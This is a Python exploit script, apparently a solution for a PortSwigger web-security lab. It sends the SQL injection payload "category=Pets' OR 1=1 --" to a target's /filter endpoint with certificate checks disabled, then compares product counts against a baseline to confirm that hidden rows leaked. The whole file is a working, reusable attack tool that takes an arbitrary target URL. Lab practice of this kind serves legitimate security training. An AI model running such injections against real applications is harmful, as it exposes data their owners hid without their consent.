import requests
import urllib3
import argparse
import sys
from bs4 import BeautifulSoup

# Disable SSL/TLS warnings to keep the terminal clean when using
# interception proxies like Burp Suite.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Optional Proxy Configuration:
# Uncomment PROXIES and add 'proxies=PROXIES' to requests.get to intercept
# traffic for further manual analysis.
# PROXIES = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def banner():
    print("""
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠙⠻⢶⣄⡀⠀⠀⠀⢀⣤⠶⠛⠛⡇⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⣙⣿⣦⣤⣴⣿⣁⠀⠀⣸⠇⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣡⣾⣿⣿⣿⣿⣿⣿⣿⣷⣌⠋⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣷⣄⡈⢻⣿⡟⢁⣠⣾⣿⣦⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⠘⣿⠃⣿⣿⣿⣿⡏⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠈⠛⣰⠿⣆⠛⠁⠀⡀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣦⠀⠘⠛⠋⠀⣴⣿⠁⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⡇⠀⠀⠀⢸⣿⣏⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠀⠀⠀⠾⢿⣿⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⡿⠟⠋⣁⣠⣤⣤⡶⠶⠶⣤⣄⠈⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⢰⣿⣿⣮⣉⣉⣉⣤⣴⣶⣿⣿⣋⡥⠄⠀⠀⠀⠀⠉⢻⣄⠀⠀⠀⠀⠀
    ⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣋⣁⣤⣀⣀⣤⣤⣤⣤⣄⣿⡄⠀⠀⠀⠀
    ⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⠁⠀⠀⠀⠀⠈⠛⠃⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")

def check_url(url):
    if url[-1] == '/':
        url = url[:-1]
    return url

def exploit(url, init_products):
    """"
    Executes the SQL injection by appending a payload to the URL.
    The goal is to break WHERE clause logic and retrieve hidden data.
    """

    complete_url = url + "/filter?category=Pets' OR 1=1 --"  # This will be the payload, you can paste the payload into your browser's address bar to see the results visually.

    r = requests.get(url=complete_url, verify=False) # To use Burp Suite or a similar proxy, include the 'proxies=proxies' parameter.

    soup = BeautifulSoup(r.text, 'html.parser')

    # Locate the product container in the modified DOM
    products_section = soup.find('section', class_='container-list-tiles')

    if products_section:
        # Count child 'div' elements (representing each product item)
        # 'recursive=False' ensures we only count direct children. 
        products = products_section.find_all('div', recursive=False)
        if len(products) > init_products:
            print(f'[INFO] After exploit, the state of the lab shows {len(products)} products')
            return True
        else:
            print(f'[INFO] After exploit, the state of the lab shows {len(products)} products')
            return False


def main(url):
    """"
    Establishes the application baseline and coordinates the exploit execution.
    """
    try:
        banner()
    except Exception:
        pass

    url = check_url(url)

    # Initial request to establish the 'Baseline'
    # (number of prodcuts visible under legitimate conditions)
    r = requests.get(url=url, verify=False) # To use Burp Suite or a similar proxy, include the , proxies=proxies parameter.

    soup = BeautifulSoup(r.text, 'html.parser')

    initial_products = soup.find('section', class_='container-list-tiles')

    if initial_products:
        # Baseline products count
        products = initial_products.find_all('div', recursive=False)
        product_count = len(products)

        print(f'[INFO] The initial state of the lab shows {product_count} products.')

        # Run exploit and compare against the baseline
        if exploit(url, product_count):
            print('[+] SUCCESS! The exploit was successful, and the lab has been solved.')
        else:
            print('[-] Error: The exploit failed to retrieve the data.')

    else:
        print('[-] Failed to detect the initial number of products.')
        sys.exit(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Python exploit for PortSwigger's SQLi lab: Modifying the WHERE clause to retrieve hidden data.")

    parser.add_argument('-t', '--target', required=True,
                        help='Target Domain | Example: https://example.com')
    args = parser.parse_args()

    main(args.target)